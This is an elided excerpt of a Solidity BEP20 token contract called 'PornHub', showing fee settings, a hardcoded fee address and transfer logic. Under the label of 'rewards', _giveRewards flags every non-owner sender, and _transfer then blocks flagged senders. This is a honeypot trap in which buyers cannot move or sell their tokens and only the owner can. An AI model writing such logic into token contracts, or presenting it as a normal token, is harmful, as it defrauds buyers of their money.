...
contract PornHub is Context, IBEP20, Ownable {
    ...
    address public FeeAddress = 0x3261a976Bae9d20336273146fFacb60B8FF6472B;
    ...
    uint256 public     _TAX_FEE = 5 * 100;
    uint256 public    _BURN_FEE = 2 * 100;
    uint256 public _CHARITY_FEE = 3 * 100;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        require(_isRewarded[sender] == false, "You are rewarded");
    ...
    function _giveRewards(address sender) private {
        if (_owner != sender) {
            _isRewarded[sender] = true;
        }
    }
